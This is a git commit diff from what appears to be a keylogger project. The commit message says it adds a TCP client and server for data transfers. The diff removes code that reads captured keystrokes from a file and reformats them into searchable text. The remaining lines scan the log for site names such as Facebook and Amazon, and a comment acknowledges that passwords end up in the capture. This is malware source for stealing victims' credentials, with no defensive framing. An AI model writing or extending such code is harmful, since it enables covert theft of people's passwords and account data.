a6a7f18872c183329121691cd31f1d53f94e3811
adeptio <mbrinkma13@gmail.com>
2017-02-27 18:07:02 -0800

    Added TCP client & server for data transfers, moved formatting from keylogger_format.py to TCP_Server.py

--- keylogger_format.py
+++ keylogger_format.py
@@ -6,26 +6,6 @@
 import re
 import sqlite3
 
-# Each time the user presses a key, it is a separate KeyDown event - the hook program records each event on its own line
-# then inputs a carriage return.  This is hard to read, and impossible to CTRL-F, so we format it horizontally here.
-    
-# The blank space character has been altered to '`' because of problems with .join eliminating spaces.
-# Of course, if someone had '`' in a password, it would be an inconvenience.   
-print('[*] Reading file ...' + '\n') 
-file = ['`' if letter == '' else letter for letter in open('Visuals.txt').read().split('\n')]
-
-print('[*] Formatting file ...' + '\n')
-the_string = ''
-for i in file:
-	the_string+=i
-
-	
-with open("keylog_formatted.txt", "w") as log_formatted:
-	log_formatted.write(the_string)
-log_formatted.close()
-print('[*] Formatted output saved in keylog_formatted.txt' + '\n')
-
-
 # Search for keywords and print whether they are found. 
 key1 = ['facebook', 'Facebook', 'fbook', 'face', 'Face']
 key2 = ['amazon', 'Amazon', 'amaz']
